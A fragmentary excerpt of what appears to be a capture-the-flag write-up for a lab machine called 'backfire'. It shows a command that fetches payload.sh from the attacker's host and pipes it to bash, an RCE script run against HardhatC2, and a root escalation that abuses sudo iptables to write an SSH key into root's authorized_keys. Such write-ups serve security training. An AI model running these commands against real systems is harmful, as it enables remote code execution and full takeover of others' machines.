...
cmd = f"curl http://{os.environ["LHOST"]}:8080/payload.sh | bash"
...
### Add Public Key
```bash
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOD4AOKmqCL2DRPY5+2h276o0EHsp0TjpcV47Pa6LvIo kali@kali
...
Run
```python
python3 hardhat_rce.py
```

### Login To HardhatC2
Go to `https://localhost:7096` and login with credentials
![[/static/backfire/20250119193528.png]]

![[/static/backfire/20250119193556.png]]
...
sudo -u root /usr/sbin/iptables -A INPUT -i lo -j ACCEPT -m comment --comment $"\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIESMWC8EpOoV3C7r5lhb8bTAcGj57xSOvNyj5WRiOBLX user@ubuntu\n"
```

```bash
sudo iptables-save -f /root/.ssh/authorized_keys
ssh -i ~/.ssh/id_ed25519 root@backfire
```
